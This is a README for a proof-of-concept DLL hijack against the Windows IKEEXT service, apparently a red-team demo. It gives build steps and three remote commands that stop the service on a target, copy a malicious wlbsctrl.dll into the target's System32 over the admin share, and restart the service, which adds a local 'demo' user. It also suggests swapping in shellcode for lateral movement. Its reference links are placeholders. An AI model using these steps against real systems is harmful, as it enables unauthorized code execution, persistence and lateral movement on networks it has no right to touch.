# wlbsctrl_poc

## Description

This is a simple C++ POC to demonstrate how DLL hijacking can be leveraged against the IKEEXT service to execute commands remotely. This project simply adds a new user called demo to the computer's users. Technically, this could also be used in the SessionEnv example; however, a C# implementation of that hijack can be found [here](LINK HERE).

One could instead implement malicious logic to run shellcode, for example, instead of adding a local user to facilitate lateral movement.

## Build Instructions

Open the solution and build the "Release" version of the dll.

## Execution

1. `sc.exe \\TARGET stop IKEEXT`
2. `copy wlbsctrl.dll \\TARGET\C$\Windows\System32\wlbsctrl.dll`
3. `sc.exe \\TARGET start IKEEXT`

The `demo` user should now be added to the Computer's users.

## Reference

* Link here
